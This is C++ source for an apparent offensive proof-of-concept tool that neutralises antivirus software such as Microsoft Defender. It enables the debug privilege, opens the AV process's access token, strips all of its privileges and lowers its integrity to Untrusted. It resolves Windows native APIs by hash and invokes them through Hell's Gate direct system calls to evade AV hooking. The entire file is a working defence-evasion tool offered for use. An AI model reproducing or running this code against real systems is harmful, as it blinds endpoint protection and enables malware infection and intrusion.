//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// A small POC to make Defender Useless by removing Token privileges and lowering Token Integrity      
//////////////////////////////////////////////////////////////////////////////////////////////////////////////


//Credits - https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/
//original code by - https://github.com/pwn1sher/KillDefender/blob/main/killdefender.cpp - I simply made this a little bit steahtlier by using native apis w/ system calls to bypass AV hooking.

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "peb_structs.h"
#include "definitions.h"


#include <conio.h>


void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {

    //populate api hashes in table.
    table->NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
    table->NtAdjustPrivilegesToken.dwHash = 0x354E8E728234EF1C;
    table->NtSetInformationToken.dwHash = 0x2C7DADE1428736A9;
    table->NtOpenProcessToken.dwHash = 0xC42B90FE8B421C48; // for OpenProcessTokenEx 0x7D53CACE643A57A5;

    //9618ee0c
    //0xffffffff9618ee0c
    //0x683158f59618ee0c

    //retieve api locations & syscalls and populate them in the table
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcess))
        return -1;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtAdjustPrivilegesToken))
        return -1;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcessToken))
        return -1;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtSetInformationToken))
        return -1;
}


BOOL EnableDebugPrivilege(PVX_TABLE table)
{
    HANDLE hToken = NULL;
    HANDLE hCurrProcess = GetCurrentProcess();
    LUID sedebugnameValue = { 0 };
    TOKEN_PRIVILEGES tkp = { 0 };
    NTSTATUS status = 0;

    HellsGate(table->NtOpenProcessToken.wSystemCall);
    status = HellDescent(hCurrProcess, TOKEN_ALL_ACCESS, &hToken);
    if (status) {
        printf("%lx\n", status);
        exit(-10);
    }
    if (!hToken)
        exit(-12);
    
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        CloseHandle(hToken);
        return FALSE;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


    //NtAdjustPrivilegesToken || ZwAdjustPrivilegesToken
    HellsGate(table->NtAdjustPrivilegesToken.wSystemCall);
    status = HellDescent(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    if (status) {
        printf("%lx\n", status);
        CloseHandle(hToken);
        return FALSE;
    }

    return TRUE;
}

int getpid(LPCWSTR procname) {

    DWORD procPID = 0;
    LPCWSTR processName = L"";
    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);


    // replace this with Ntquerysystemapi
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processName, procname) != 0)
        {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            procPID = processEntry.th32ProcessID;
        }
        printf("[+] Got target proc PID: %d\n", procPID);
    }

    return procPID;
}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege,   // to enable or disable privilege
    PVX_TABLE table
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.
    NTSTATUS status = 0;
    //NtAdjustPrivilegesToken || ZwAdjustPrivilegesToken
    HellsGate(table->NtAdjustPrivilegesToken.wSystemCall);
    status = HellDescent(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    if (status) {
        printf("Adjusting Token Priv for %s Failed. Err Code: %lx", lpszPrivilege, status);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

//This function obtains a pointer to the TEB using the GS register + 48 bytes (30 hex)
//then using the TEB we obtain a pointer to the PEB and return that value.
PPEB GetPointerToPEB() {
    PTEB pTEB = RtlGetThreadEnvironmentBlock();
    PPEB pPEB = pTEB->ProcessEnvironmentBlock;
    if (!pTEB || !pPEB || pPEB->OSMajorVersion != 0xA) {
        return -1;
    }
    return pPEB;
}


int main(int argc, char** argv)
{

    if (argc < 2) {
        printf("[*] Usage: PPL_Sandboxer vsserv.exe\n");
        printf("[*] This tool is used to strip the security rights of access tokens for targeted processes.\n");
        printf("[*] By removing the the access token rights, the process no longer has the rights to say scan newly uploaded files on disk. I.E. removes AV functionality.\n");
        exit(-1);
    }

    //printf("First argument: %s\n", argv[0]);
    printf("Second argument: %s\n", argv[1]);

    //obtain pointer to PEB.
    PPEB pPEB = GetPointerToPEB();

    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    //Get EAT Table
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return -1;
    //Create VXTable
    VX_TABLE table = { 0 };

    //Populate its entries
    PopulateVxTable(&table, pImageExportDirectory, pLdrDataEntry);


    LUID sedebugnameValue;
    EnableDebugPrivilege(&table);

    wchar_t procname[80] = { 0 };
    
    MultiByteToWideChar(CP_UTF8, 0, argv[1], strlen(argv[1]), procname, 80);
    int pid = getpid(procname);


    // printf("PID %d\n", pid);
    printf("[*] Killing Service...\n");

    // hardcoding PID of msmpeng for now
    //NtOpenProcess
   // HANDLE pHandle = NULL;
    //NtOpenProcess()
    NTSTATUS status = 0;
    HANDLE hVicProc = NULL;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES objectAttributes = { 0 };
    ClientId.UniqueThread = NULL;
    ClientId.UniqueProcess = ULongToHandle(pid);

    HellsGate(table.NtOpenProcess.wSystemCall);
    status = HellDescent(&hVicProc, PROCESS_QUERY_LIMITED_INFORMATION, &objectAttributes, &ClientId);
    if (status) {
        printf("[-] Could not open target process. Err code %lx\n", status);
        exit(-11);
    }

    //HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (hVicProc != INVALID_HANDLE_VALUE) {

        printf("[*] Opened Target Handle\n");
    }
    else {
        printf("[-] Failed to open Process Handle\n");
    }

    // printf("%p\n", phandle);

    HANDLE ptoken;
    HellsGate(table.NtOpenProcessToken.wSystemCall);
    status = HellDescent(hVicProc, TOKEN_ALL_ACCESS, &ptoken);
    if (status) {
        printf("[-] Could not open handle to target process' access token. Err Code: %lx\n", status);
        exit(-12);
    }
    //BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);

    if (ptoken) {
        printf("[*] Opened Target Token Handle\n");
    }
    else {
        printf("[-] Failed to open Token Handle\n");
    }

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);


    TOKEN_PRIVILEGES tkp;

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    //NtAdjustPrivilegesToken || ZwAdjustPrivilegesToken
    HellsGate(table.NtAdjustPrivilegesToken.wSystemCall);
    status = HellDescent(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    if (status) {
        printf("[-] Could not set the debug privilege on the target process token. Err Code: %lx\n", status);
        return -24;
    }
    

    // Remove all privileges
    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_TCB_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE, &table);
    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE, &table);

    printf("[*] Removed All Privileges\n");


    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;


    SID integrityLevelSid = {0};
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {0};
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

    //ZwSetTokenInformation NtSetTokenInformation
    HellsGate(table.NtSetInformationToken.wSystemCall);
    status = HellDescent(ptoken, TokenIntegrityLevel, &tokenIntegrityLevel, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid));
    if (status) {
        printf("[-] Failed to Set Token Information. Err Code: %lx", status);
        return 0;
    }
    else {
        printf("[*] Token Integrity set to Untrusted");
    }

    CloseHandle(ptoken);
    CloseHandle(hVicProc);

    return 0;
}